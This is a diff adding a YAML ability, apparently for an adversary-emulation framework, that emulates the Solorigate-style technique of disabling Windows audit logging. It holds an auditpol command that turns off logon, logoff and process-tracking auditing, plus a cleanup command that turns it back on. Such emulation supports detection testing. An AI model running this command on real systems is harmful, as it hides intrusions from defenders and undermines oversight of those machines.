@@ -1,0 +1,21 @@
+---
+- id: 2a450a37a8601a2131ad0ecdb8188b54
+  name: Impair Windows Audit Log Policy
+  description: 'Disables the windows audit policy to prevent key host based telemetry
+    being written into the event logs.
+
+    [Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685.001
+    name: 'Disable or Modify Tools: Disable or Modify Windows Event Log'
+  platforms:
+    windows:
+      cmd:
+        command: auditpol /set /category:"Account Logon" /success:disable /failure:disable
+          && auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
+          && auditpol /set /category:"Detailed Tracking" /success:disable
+        payloads: []
+        cleanup: auditpol /set /category:"Account Logon" /success:enable /failure:enable
+          && auditpol /set /category:"Detailed Tracking" /success:enable && auditpol
+          /set /category:"Logon/Logoff" /success:enable /failure:enable
